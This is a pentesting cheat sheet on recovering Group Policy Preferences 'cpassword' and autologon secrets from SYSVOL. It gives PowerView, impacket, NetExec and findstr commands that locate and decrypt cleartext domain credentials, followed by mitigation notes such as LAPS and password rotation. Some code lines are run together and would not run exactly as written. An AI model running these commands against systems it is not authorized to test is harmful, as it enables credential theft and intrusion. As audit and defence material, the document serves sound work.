# GPO GPP Group Policy Preferences Passwords
- GPP MS14-025
- Purpose: locate **GPP (cpassword)** and **Autologon** secrets stored in Group Policy objects. Use only in authorized environments.  
- Output includes: at least **two tool-methods**, commands to _find_ candidate files/entries and to _decrypt_ cpassword values / identify autologon passwords, plus short mitigation notes.
## Overview (what to look for)
- **GPP (Group Policy Preferences)** stores managed local account / service account passwords as `cpassword` attributes inside XML files under SYSVOL:
    
    - `\\<DC>\SYSVOL\<domain>\Policies\<GPO_GUID>\Machine\Preferences\...`
        
    - Common XML locations: `Groups`, `Services`, `ScheduledTasks`, `Printers`, `Files`, `Registry`, `Drives`, `Shortcuts`.
        
- **Autologon** for GPO Preferences is stored as registry preference entries (`DefaultPassword`, `AutoAdminLogon`, etc.) in the same `Preferences\Registry` XML files, or under `Winlogon` registry.pol entries.
    
- `cpassword` values are encrypted with a **static Microsoft key** (therefore trivially decryptable with public tools).
    

---
## GPO

```bash
import PowerView (adjust path to your copy) Import-Module .\PowerView.ps1  
# Simple: find and decrypt all GPP passwords from SYSVOL (uses domain & sysvol access) 
Get-GPPPassword -Domain 'corp.local' -Verbose  
# Or, export to CSV for post-processing 
Get-GPPPassword -Domain 'corp.local' | Export-Csv -Path .\gpp_passwords.csv -NoTypeInformation

impacket-Get-GPPPassword # impacket-Get-GPPPassword

impacket-Get-GPPPassword mydomain.local/auditor:SecureP@ss123@192.168.1.10  # Online/LIVE mode
impacket-Get-GPPPassword -xmlfile ./gpp_files/Groups.xml  # offline mode


# Example: run CME against a domain controller and request GPP data 
nxc smb dc01.corp.local -u 'CORP\\alice' -p 'AlicePass!' -M gpp 

# LOLBins
findstr /S /I cpassword \\<domain_fqdn>\sysvol\<domain_fqdn>\policies\*.xml

```

**Notes:**
- `Get-GPPPassword` will fetch the XMLs from SYSVOL and automatically decrypt `cpassword`.
    
- Output fields include the GPO path, account name, username, and cleartext password.
    

---
## Autologon specifics

```powershell
Import-Module .\PowerView.ps1
# This command looks for autologon settings in the local machine's registry
Get-RegistryAutoLogon

#To specifically search for _autologon_ registry preference entries in GPO XML files:
$gpoPath = "\\dc01.corp.local\SYSVOL\corp.local\Policies\*" Get-ChildItem -Path $gpoPath -Recurse -Include *.xml |   Select-String -Pattern 'DefaultPassword|AutoAdminLogon|AutoLogon|cpassword' -SimpleMatch |   ForEach-Object { $_.Path; $_.Line }
```
---
## Detection & Mitigation (short)

- **Remove GPP-stored passwords:** Replace GPP-managed passwords with managed service accounts, gMSA, or central secrets management. Do **not** store static passwords in GPP.
- **Rotate** any passwords discovered immediately (including local admin/service accounts).
- **Disable** Autologon or ensure it is not deployed via GPO with plaintext passwords.
- **Limit SYSVOL access:** Only domain-joined machines and admins should read SYSVOL content; monitor and alert on unusual access to `\\<DC>\SYSVOL`.
- **Audit GPO changes** and enable monitoring for `cpassword` or registry password entries in GPOs.
- Consider deploying **Microsoft LAPS** for local admin password management instead of GPP.
#### Mitigation
**Mitigation:** The issue was addressed by Microsoft (MS14-025) which prevented the creation of _new_ GPPs with passwords. 
- However, **existing GPPs** containing passwords were not automatically removed. 
- The recommended modern defense is to use **Windows Local Administrator Password Solution (LAPS)**, which ensures every local administrator account has a unique, rotating password stored securely in Active Directory.

---
## References / further reading
- PowerView / PowerSploit `Get-GPPPassword` (PowerShell) — used to fetch & decrypt.
- `gpp-decrypt.py` (public python implementations) — decrypts `cpassword`.
- `CrackMapExec` `gpp` module — automates discovery via SMB.